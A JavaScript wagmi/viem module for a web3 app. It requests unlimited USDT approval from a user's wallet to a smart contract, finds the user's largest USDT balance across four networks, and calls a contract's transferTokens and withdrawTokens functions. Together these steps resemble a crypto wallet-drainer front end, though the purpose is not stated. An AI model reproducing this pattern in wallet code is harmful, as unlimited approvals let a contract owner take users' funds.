import { writeContract, readContract } from 'wagmi/actions'
import { parseUnits, maxUint256 } from 'viem'
import { wagmiConfig } from './config.jsx'

// USDT ERC20 Token Addresses across different networks
export const USDT_ADDRESSES = {
  // Ethereum Mainnet
  ethereum: "0xdac17f958d2ee523a2206206994597c13d831ec7",
  // Polygon
  polygon: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
  // Arbitrum
  arbitrum: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
  // Base
  base: "0x50c5725949a6f0c72e6c4a641f24049a917db0cb"
}

// ERC20 ABI for approve and allowance functions
export const ERC20_ABI = [
  {
    type: 'function',
    stateMutability: 'nonpayable',
    outputs: [{ name: '', type: 'bool' }],
    name: 'approve',
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ]
  },
  {
    type: 'function',
    stateMutability: 'view',
    outputs: [{ name: '', type: 'uint256' }],
    name: 'allowance',
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' }
    ]
  },
  {
    type: 'function',
    stateMutability: 'view',
    outputs: [{ name: '', type: 'uint256' }],
    name: 'balanceOf',
    inputs: [{ name: 'account', type: 'address' }]
  }
]

// TokenTransfer contract ABI
export const tokenTransferAbi = [
  {
    type: 'function',
    stateMutability: 'view',
    outputs: [{ name: '', type: 'address' }],
    name: 'owner',
    inputs: []
  },
  {
    type: 'function',
    stateMutability: 'view',
    outputs: [{ name: '', type: 'address' }],
    name: 'token',
    inputs: []
  },
  {
    type: 'function',
    stateMutability: 'nonpayable',
    outputs: [],
    name: 'transferTokens',
    inputs: [
      { name: 'recipient', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ]
  },
  {
    type: 'function',
    stateMutability: 'nonpayable',
    outputs: [],
    name: 'withdrawTokens',
    inputs: [
      { name: 'recipient', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ]
  },
  {
    type: 'event',
    name: 'TokensTransferred',
    inputs: [
      { name: 'from', type: 'address', indexed: true },
      { name: 'to', type: 'address', indexed: true },
      { name: 'amount', type: 'uint256', indexed: false }
    ],
    anonymous: false
  }
]

// Approve USDT tokens for maximum spending by smart contract
export async function approveUSDT({ smartContractAddress, userAddress, network = 'ethereum' }) {
  if (!smartContractAddress) throw new Error('smartContractAddress is required')
  if (!userAddress) throw new Error('userAddress is required')

  const usdtAddress = USDT_ADDRESSES[network]
  if (!usdtAddress) throw new Error(`Unsupported network: ${network}`)

  return writeContract(wagmiConfig, {
    address: usdtAddress,
    abi: ERC20_ABI,
    functionName: 'approve',
    args: [smartContractAddress, maxUint256]
  })
}

// Check USDT allowance for smart contract
export async function checkUSDTAllowance({ smartContractAddress, userAddress, network = 'ethereum' }) {
  if (!smartContractAddress) throw new Error('smartContractAddress is required')
  if (!userAddress) throw new Error('userAddress is required')

  const usdtAddress = USDT_ADDRESSES[network]
  if (!usdtAddress) throw new Error(`Unsupported network: ${network}`)

  return readContract(wagmiConfig, {
    address: usdtAddress,
    abi: ERC20_ABI,
    functionName: 'allowance',
    args: [userAddress, smartContractAddress]
  })
}

// Check USDT balance of user on a specific network
export async function checkUSDTBalance({ userAddress, network = 'ethereum' }) {
  if (!userAddress) throw new Error('userAddress is required')
  
  const usdtAddress = USDT_ADDRESSES[network]
  if (!usdtAddress) throw new Error(`Unsupported network: ${network}`)

  return readContract(wagmiConfig, {
    address: usdtAddress,
    abi: ERC20_ABI,
    functionName: 'balanceOf',
    args: [userAddress]
  })
}

// Check USDT balance across all networks and return the highest
export async function checkUSDTBalanceAllNetworks({ userAddress }) {
  if (!userAddress) throw new Error('userAddress is required')

  const networks = Object.keys(USDT_ADDRESSES)
  const balancePromises = networks.map(async (network) => {
    try {
      const balance = await checkUSDTBalance({ userAddress, network })
      return {
        network,
        balance: parseUSDTAmount(balance),
        rawBalance: balance
      }
    } catch (error) {
      console.warn(`Failed to check balance on ${network}:`, error)
      return {
        network,
        balance: 0,
        rawBalance: 0n
      }
    }
  })

  const results = await Promise.all(balancePromises)
  const highestBalance = results.reduce((max, current) => 
    current.balance > max.balance ? current : max
  )

  return {
    highest: highestBalance,
    allBalances: results
  }
}

// Call TokenTransfer contract functions
export async function callTransferTokens({ contractAddress, recipientAddress, amount }) {
  if (!contractAddress) throw new Error('contractAddress is required')
  if (!recipientAddress) throw new Error('recipientAddress is required')
  if (amount === undefined || amount === null) throw new Error('amount is required')

  return writeContract(wagmiConfig, {
    address: contractAddress,
    abi: tokenTransferAbi,
    functionName: 'transferTokens',
    args: [recipientAddress, amount]
  })
}

export async function callWithdrawTokens({ contractAddress, recipientAddress, amount }) {
  if (!contractAddress) throw new Error('contractAddress is required')
  if (!recipientAddress) throw new Error('recipientAddress is required')
  if (amount === undefined || amount === null) throw new Error('amount is required')

  return writeContract(wagmiConfig, {
    address: contractAddress,
    abi: tokenTransferAbi,
    functionName: 'withdrawTokens',
    args: [recipientAddress, amount]
  })
}

// Helper function to format USDT amount (USDT has 6 decimals)
export function formatUSDTAmount(amount) {
  return parseUnits(amount.toString(), 6)
}

// Helper function to parse USDT amount from contract response
export function parseUSDTAmount(amount) {
  return Number(amount) / Math.pow(10, 6)
}
